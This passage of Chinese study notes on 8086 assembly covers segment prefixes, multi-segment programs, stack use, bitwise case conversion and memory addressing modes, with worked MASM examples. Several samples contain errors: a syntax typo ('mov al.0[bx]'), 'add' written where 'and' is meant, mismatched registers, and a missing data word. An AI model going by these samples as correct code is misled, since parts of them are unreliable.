段前缀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,ds:[bx]//将一个内存单元内容送入ax，这个内存单元长度为2字节，存放一个字，偏移地址在bx中，段地址在ds中<br>cs:[bx]<br>ss:[bx]<br>es:[bx]<br>mov ax,ss:[0]//将一个内存单元内容送入ax，这个内存单元长度为2字节，存放一个字，偏移地址为0，段地址在ss中<br>cs:[0]<br></code></pre></td></tr></table></figure><p>段前缀用于显示地指明内存单元的段地址，如”ds”,“cs”,“ss”,“es”等</p><h3 id="5-7-一段安全的空间"><a href="#5-7-一段安全的空间" class="headerlink" title="5.7 一段安全的空间"></a>5.7 一段安全的空间</h3><ul><li>直接向一段内存写入内容</li><li>这段内容不应存放系统或其他程序的数据或代码,否则写入操作可能引发错误</li><li>DOS 方式下，一般情况，0:200~0:2ff 空间中没有系统或其他程序的数据或代码</li><li><strong>要直接向一段内存中写入内容时，使用 0:200~0:2ff 这段空间</strong></li></ul><h3 id="5-8-段前缀的使用"><a href="#5-8-段前缀的使用" class="headerlink" title="5.8 段前缀的使用"></a>5.8 段前缀的使用</h3><p>e.g 将内存 ffff:0~fff:b 单元处的数据复制到 0:200-0:20b 单元中</p><ul><li><p>0:200-0:20b 相当于 0020:0-0020:b 单元</p></li><li><p>初始化：X&#x3D;0  循环12次：将ffff:X单元的数据送入 0020:X     X&#x3D;X+1 </p></li><li><p>源始单元 ffff:X 和目标单元 0020:X 的偏移地址X是变量。用 bx 存放</p></li><li><p>将 0:200-0:20b 用 0020:0-0020:b 描述，使目标单元的偏移地址和源始单元的偏移地址从同一数值 0 开始</p><p><strong>使用两个寄存器分别存放源始单元 ffff:X 和目标单元 0020:X 的段地址</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,0ffffh<br>mov ds,ax//(ds)=0ffffh<br><br>mov ax,0020h<br>mov es,ax//(es)=0020h<br><br>mov bx,0//(bx)=0,此时ds:bx指向0fffh:0,es:bx指向0020h:0<br><br>mov cx,12//(cx)=12<br><br>s:mov dl,[bx]//(dl)=((ds)*16+(bx)),将ffff:bx中的数据送入dl<br>mov es:[bx],dl//(es)*16+(bx)=(dl),将dl中数据送入0020:bx<br>inc bx//(bx)=(bx)+1<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h1 id="六、包含多个段的程序"><a href="#六、包含多个段的程序" class="headerlink" title="六、包含多个段的程序"></a>六、包含多个段的程序</h1><h3 id="6-1-在代码块中使用数据"><a href="#6-1-在代码块中使用数据" class="headerlink" title="6.1 在代码块中使用数据"></a>6.1 在代码块中使用数据</h3><p>框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>:<br>数据<br>:<br>start:<br>:<br>代码<br>:<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g. 计算以下八个数据的和，结果存在ax寄存器中：0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h//dw定义字型数据。即“define word”<br>start:mov bx,0<br>mov ax,0<br><br>mov cx,8<br>s:add ax,cs:[bx]<br>add bx,2<br>loop s<br><br>mov ax,4c00h<br>            int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="6-2-在代码段中使用栈"><a href="#6-2-在代码段中使用栈" class="headerlink" title="6.2 在代码段中使用栈"></a>6.2 在代码段中使用栈</h3><p>利用栈，将数据0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h逆序存放，数据存放在cs:10-cs:2F单元中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0//用dw定义16个字型数据，在程序加载后，会取得16个字的内存空间，存放这16个数据。后面程序中将这段空间当作栈来使用<br><br>start:mov ax,cs<br>mov ss,ax<br>mov sp,30h//将设置栈顶ss:sp指向cs:30<br><br>mov bx,0<br>mov cx,8<br>s:push cs:[bx]<br>add bx,2<br>loop s//以上代码0-15单元中的8个字符数据依次入栈<br><br>mov bx,0<br>mov cx,8<br>s0:pop cs:[bx]<br>add bx,2<br>loop s0//依次出栈8个字符型数据到代码段0-15单元中<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>1.e.g 下面的程序依次实现使用内存0:0-0:15单元中的内容改写程序中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0fedh,0cbah,0987h<br>start:mov ax,0<br>mov ds,ax<br>mov bx,0//ds=0,bx=0<br><br>mov cx,8<br>s:mov ax,[bx]//将ds:0数据送入ax<br>mov cs:[bx],ax//(cs)*16+(bx)=(ax),将ax数据送入cs:0处<br>add bx,2//cs:2<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>用栈来进行数据传送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>start:mov ax,cs<br>mov ss,ax<br>mov sp,24h<br><br>mov ax,0<br>mov ds,ax<br>mov bx,0<br>mov cx,8<br>s:push [bx]<br>pop cs:[bx]<br>add bx,2<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="6-3-将数据、代码、栈放入不同的段"><a href="#6-3-将数据、代码、栈放入不同的段" class="headerlink" title="6.3 将数据、代码、栈放入不同的段"></a>6.3 将数据、代码、栈放入不同的段</h3><p>逆序存放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code,ds:data,ss:stack<br>data segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>data ends<br>stack segment<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>stack ends<br>code segment<br>start:mov ax,stack<br>mov ss,ax<br>mov sp,20h//设置栈顶ss:sp指向stack:20<br><br>mov ax,data<br>mov ds,ax//ds指向data段<br><br>mov bx,0//ds:bx指向data段中第一个单元<br><br>mov cx,8<br>s:push [bx]<br>add bx,2<br>loop s//将data段中0-15单元中的8个字符型数据依次入栈<br><br>mov bx,0<br><br>mov cx,8<br>s0:pop [bx]<br>add bx,2<br>loop s0//依次出栈到data段的0-15单元中<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="七、定位内存地址的方法"><a href="#七、定位内存地址的方法" class="headerlink" title="七、定位内存地址的方法"></a>七、定位内存地址的方法</h1><h3 id="7-1-and和or指令"><a href="#7-1-and和or指令" class="headerlink" title="7.1 and和or指令"></a>7.1 and和or指令</h3><p>1）and 指令：逻辑与，按位进行与运算（两个1才是1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01100011B<br>and al,00111011B<br>结果 al=00100011B<br></code></pre></td></tr></table></figure><p>2）or 指令：逻辑或，按位进行或运算（有1就为1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,01100011B<br>or  al,00111011B<br>结果 al=01111011B<br></code></pre></td></tr></table></figure><h3 id="7-3-以字符形式给出的数据"><a href="#7-3-以字符形式给出的数据" class="headerlink" title="7.3 以字符形式给出的数据"></a>7.3 以字符形式给出的数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code,ds:data<br>data segment<br>db &#x27;unIX&#x27;//相当于“db 75H,6EH,49H,58H”,db定义字节变量，类似dw<br>db &#x27;foRK&#x27;//相当于“db 66H,6FH,52H,4BH”<br>data ends<br>code segment<br>start:mov al,&#x27;a&#x27;//mov al,61H<br>mov bl,&#x27;b&#x27;<br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-4-大小写转换"><a href="#7-4-大小写转换" class="headerlink" title="7.4 大小写转换"></a>7.4 大小写转换</h3><p>判断某一位置是 0 还是 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;BaSiC&#x27;<br>db &#x27;iNfOrMaTiOn&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax//设置ds指向datasg段<br> <br>mov bx,0//设置(bx)=0,ds:bx指向&#x27;BaSiC&#x27;的第一个字母<br><br>mov cx,5//设置循环次数<br>     s:mov al,[bx]//将ASCII码从ds:bx所指向的单元中取出<br>and al,11011111B//将al中的ASCII码的第五位为0，变为大写字母<br>mov [bx],al//转换后的ASCII码写回原单元<br>inc bx//ds:bx指向下一个字母<br>loop s<br><br>mov bx,5//(bx)=5,ds:bx指向&#x27;iNfOrMaTiOn&#x27;的第一个字母<br><br>mov cx,11<br>s0:mov al,[bx]<br>or al,00100000B//将al中的ASCII码第5位置为1，变为小写字母<br>mov [bx],al<br>inc bx<br>loop s0<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-5-bx-idata"><a href="#7-5-bx-idata" class="headerlink" title="7.5 [bx+idata]"></a>7.5 [bx+idata]</h3><p>[bx+idata] 表示一个内存单元，偏移地址为 (bx) + idata ( bx中的数值加上 idata )</p><p>mov ax,[bx+200] 的含义:</p><ul><li>将一个内存单元送入ax，内存单元长度为 2 个字节（字单元），存放一个字，偏移地址为 bx 中的数值加上200，段地址在ds中</li><li>(ax)&#x3D;((ds)*16+(bx)+200)</li><li>mov ax,[200+bx]</li></ul><p>​mov ax,200[bx]</p><p>​mov ax,[bx].200</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">2000:1000 BE 00 06 00 00 00 ...<br>写出下面的程序执行后，ax、bx、cx中的内容<br>mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br><br>mov ax,[bx]//访问的段地址在ds中，(ds)=2000H;偏移地址在bx中,(bx)=1000H;指令执行后(ax)=00BEH<br><br>mov cx,[bx+1]//偏移地址=(bx)+1=1001H;后(cx)=0600H<br><br>add cx,[bx+2]//偏移地址=(bx)+2=1002H;后(cx)=0606H<br></code></pre></td></tr></table></figure><h3 id="7-6-用-bx-idata-的方式进行数组的处理"><a href="#7-6-用-bx-idata-的方式进行数组的处理" class="headerlink" title="7.6  用 [bx+idata] 的方式进行数组的处理"></a>7.6  用 [bx+idata] 的方式进行数组的处理</h3><p>将 datasg 中定义的第一个字符串转化为大写，第二个字符串转化为小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;BaSiC&#x27;<br>db &#x27;MinIX&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> <br> mov cx,5<br> s:mov al.0[bx]<br> and al,11011111b<br> mov 0[bx],al<br> mov al,5[bx]([5+bx])<br> or al,00100000b<br> mov 5[bx]([5+bx]),al<br> inc bx<br> loop s<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-7-SI和DI"><a href="#7-7-SI和DI" class="headerlink" title="7.7 SI和DI"></a>7.7 SI和DI</h3><p>si 和 di 是 8086CPU 中和 bx 功能相近的寄存器，不能分成两个 8 位寄存器来使用</p><p>下面三组实现同一功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,0<br>mov ax,[bx]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov si,0<br>mov ax,[si]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov di,0<br>mov ax,[di]<br></code></pre></td></tr></table></figure><p>下面三组实现同一功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov bx,0<br>mov ax,[di]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov si,0<br>mov ax,[si+123]<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov di,0<br>mov ax,[di+123]<br></code></pre></td></tr></table></figure><p>e.g 用 si 和 di 实现将字符串’welcome to masm!’复制到它后面的数据中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db &#x27;welcome to masm!&#x27;<br>db &#x27;................&#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov si,0<br> mov di,0<br> mov cx,8<br> s:mov ax,[si]<br> mov [di],ax<br> add si,2<br> add di,2<br> loop s<br> mov ax,4c00h<br> int 21h<br>codesg ends<br>end start<br>//ds:si指向要复制的源始字符串，用ds:di指向复制的目的空间。用16位寄存器进行内存单元之间的数据传送，一次复制2个字节，循环8次<br></code></pre></td></tr></table></figure><p>使用 [bx(si或di)+idata] 的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov si,0<br> <br> mov cx,8<br> s:mov ax,0[si]<br> mov 16[si],ax<br> add si,2<br> loop s<br> <br> mov ax,4c00h<br> int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="7-8-bx-si-和-bx-di"><a href="#7-8-bx-si-和-bx-di" class="headerlink" title="7.8 [bx+si] 和 [bx+di]"></a>7.8 [bx+si] 和 [bx+di]</h3><p>[bx+si] 表示一个内存单元，偏移地址为 (bx)+(si) 即 bx 中的数值加上 si 的数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx+si]<br>将一个内存单元的内容送入ax，内存单元的长度为2字节（字单元），存放一个字，偏移地址为bx中的数值加上si中的数值，段地址在ds中<br>(ax)=((ds)*16+(bx)+(si))<br><br>也可写为如下格式<br>mov ax,[bx][si]<br></code></pre></td></tr></table></figure><p>e.g 2000：1000  BE  00  06  00  00  00  ….. ,写出ax、bx、cx中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br>mov si,0<br>mov ax,[bx+si]//段地址在ds中,(ds)=2000H;偏移地址=(bx)+(si)=1000H;指令执行后(ax)=00BEH<br><br>inc si<br>mov cx,[bx+si]//段地址在ds中,(ds)=2000H;偏移地址=(bx)+(si)=1001H;执行指令后(cx)=0600H<br><br>inc si<br>mov di,si<br>add cx,[bx+di]//段地址在ds中,(ds)=2000H;偏移地址=(bx)+(di)=1002H;执行指令后(cx)=0606H<br></code></pre></td></tr></table></figure><h3 id="7-9-bx-si-idata-和-bx-di-idata"><a href="#7-9-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.9  [bx+si+idata] 和 [bx+di+idata]"></a>7.9  [bx+si+idata] 和 [bx+di+idata]</h3><p>[bx+si+idata] 表示一个单元，偏移地址为 (bx)+(si)+idata (即bx中数值加上si中的数值再加上idata)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx+si+idata]<br>将内存单元送入ax，偏移地址为bx加上si数值再加上idata,段地址在ds中<br>(ax)=((ds)*16+(bx)+(si)+idata)<br><br>也有下面这些格式<br>mov ax,[bx+200+si]<br>mov ax,[200+bx+si]<br>mov ax,200[bx][si]<br>mov ax,[bx].200[si]<br>mov ax,[bx][si].200<br></code></pre></td></tr></table></figure><p>e.g 2000：1000  BE  00  06  00  6A  22  ……写出ax、bx、cx内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H<br>mov si,0<br>mov ax,[bx+2+si]//段地址在ds中,(ds)=2000H,偏移地址=(bx)+(si)+2=1002H;(ax)=0006H<br><br>inc si<br>mov cx,[bx+2+si]//(ds)=2000H,偏移地址=(bx)+2+(si)=1003H;(cx)=6A00H<br><br>inc si<br>mov di,si<br>mov bx,[bx+2+di]//偏移地址=(bx)+2+(di)=1004H;(bx)=226AH<br></code></pre></td></tr></table></figure><h3 id="7-10-不同的寻址方式的灵活运用"><a href="#7-10-不同的寻址方式的灵活运用" class="headerlink" title="7.10 不同的寻址方式的灵活运用"></a>7.10 不同的寻址方式的灵活运用</h3><ul><li><strong>[idata]</strong> 用<strong>常量</strong>表示地址，可以直接定位一个内存单元</li><li><strong>[bx] <strong>用</strong>变量</strong>来表示内存地址，可以间接定位一个内存单元</li><li><strong>[bx+idata] <strong>用</strong>变量和常量</strong>表示内存地址，可以在起始地址的基础上用变量间接定位一个内存单元</li><li><strong>[bx+si]</strong> 用<strong>两个变量</strong>表示地址</li><li><strong>[bx+si+idata]</strong> 用<strong>两个变量和一个常量</strong>表示地址</li></ul><p>e.g 将datasg段中每个单词的头改为大写字母</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db&#x27;1. file            &#x27;<br>db&#x27;2. edit            &#x27;<br>db&#x27;3. search          &#x27;<br>db&#x27;4. view            &#x27;<br>db&#x27;5. options         &#x27;<br>db&#x27;6. help            &#x27;<br>datasg ends<br>codesg segment<br> start:mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> mov cx,6<br> s:mov al,[bx+3]<br> and al,11011111b<br> mov [bx+3],al<br> add bx,16<br> loop s<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5f0c30d2f046e045.png"></p><p>e.g 将 datasg 段中每个单词改为大写字母</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg<br>datasg segment<br>db&#x27;ibm             &#x27;<br>db&#x27;dec             &#x27;<br>db&#x27;dos             &#x27;<br>db&#x27;vax             &#x27;<br>datasg ends<br>codesg segment<br>start:mov ax,datasg<br>mov ds,ax<br>mov bx,0//R=第一行地址<br><br>mov cx,4<br><br>s0:mov si,0//C=第一列地址<br>mov cx,3<br><br>s1:mov al,[bx+si]<br>and al,11011111b//改变R行,C列的字母变为大写<br>mov [bx+si],al<br>inc si//下一列地址<br><br>loop s<br><br>add bx,16//下一行地址<br>loop s0<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e03372fdfe062d0f.png"></p><p>改进程序</p><p><strong>一般情况下，需要暂存数据的时候，应该使用栈</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:datasg,ss:stacksg<br>datasg segment<br>db&#x27;ibm             &#x27;<br>db&#x27;dec             &#x27;<br>db&#x27;dos             &#x27;<br>db&#x27;vax             &#x27;<br>datasg ends<br><br>stacksg segment<br>dw 0,0,0,0,0,0,0,0<br>stacksg ends<br><br>codesg segment<br> start:mov ax,stacksg<br> mov ss,ax<br> mov sp,16<br> mov ax,datasg<br> mov ds,ax<br> mov bx,0<br> mov cx,4<br> <br> s0:push cx//将外层循环的cx值压栈<br> mov si,0<br> mov cx,3//cx设置成内层循环的次数<br> <br> s:mov al,[bx+si]<br> add al,11011111b<br> mov [bx+si],al<br> inc si<br> loop s<br> <br> add bx,16<br> pop cx//从栈顶弹出原cx的值，恢复cx<br> loop s0//外层循环的loop指令将cx中的值-1<br> <br> 